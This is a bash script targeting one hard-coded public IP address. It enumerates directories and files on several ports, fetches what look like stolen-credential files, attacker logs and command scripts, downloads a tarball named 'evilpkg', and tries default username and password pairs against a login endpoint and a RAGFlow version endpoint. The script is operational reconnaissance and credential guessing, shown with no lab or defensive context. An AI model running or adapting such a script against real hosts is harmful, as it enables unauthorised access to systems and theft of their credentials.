#!/bin/bash
set +e
H=123.184.7.135
log(){ echo "$@"; }
log "### GV7 $(date -u +%FT%TZ)"
g(){ echo "===== $1"; timeout 10 curl -s "$1" | head -c "${2:-6000}"; echo; }

log "### D1-8090-dirs"
g "http://$H:8090/bak/" 3000
g "http://$H:8090/log/" 3000
g "http://$H:8090/krig/" 3000
log "### D2-8090-files"
for f in readme.txt help.txt q.txt k466.txt status.txt keep.sh p2.sh krig_dl.sh boot_krig.sh.orig boot_wr.sh.orig recon929.sh; do g "http://$H:8090/$f" 4000; done
g "http://$H:8090/plant.log" 3000
g "http://$H:8090/recon929.out" 3000

log "### D3-8099-plh"
g "http://$H:8099/.plh/" 6000
log "### D4-8099-files"
for f in boot.txt .seq cmd.sh cmd1.sh cmd2.sh c16.sh c17.sh c18.sh c19.sh c20.sh c21.sh d3.txt d4.txt; do g "http://$H:8099/$f" 4000; done
g "http://$H:8099/access.log" 4000
g "http://$H:8099/hits.log" 3000
g "http://$H:8099/diag6421.txt" 3000
g "http://$H:8099/i6821_creds.txt" 3000

log "### D5-8899"
g "http://$H:8899/repo.git/HEAD" 200
g "http://$H:8899/repo.git/config" 2000
g "http://$H:8899/repo.git/info/refs?service=git-upload-pack" 600
g "http://$H:8899/http.log" 3000
echo "===== evilpkg"
timeout 15 curl -s -o /tmp/evilpkg.tgz "http://$H:8899/evilpkg-0.1.tar.gz"; ls -l /tmp/evilpkg.tgz; tar tzvf /tmp/evilpkg.tgz 2>&1 | head -20; tar xzOf /tmp/evilpkg.tgz 2>/dev/null | head -c 3000

log "### D6-9099-openapi-save"
timeout 12 curl -s "http://$H:9099/openapi.json" | head -c 20000
echo "===== login tries"
for C in "admin:admin123" "admin:admin" "inspur:inspur" "admin:Inspur@123"; do
  u=${C%%:*}; p=${C#*:}
  R=$(timeout 8 curl -s -o /tmp/l -w '%{http_code}' -X POST "http://$H:9099/login" -d "username=$u&password=$p"); echo "LOGIN $u -> $R"; head -c 300 /tmp/l; echo
done
log "### D7-18080-ragflow-ver"
g "http://$H:18080/v1/system/version" 500
g "http://$H:18080/api/v1/system/version" 500
log "### DONE7"
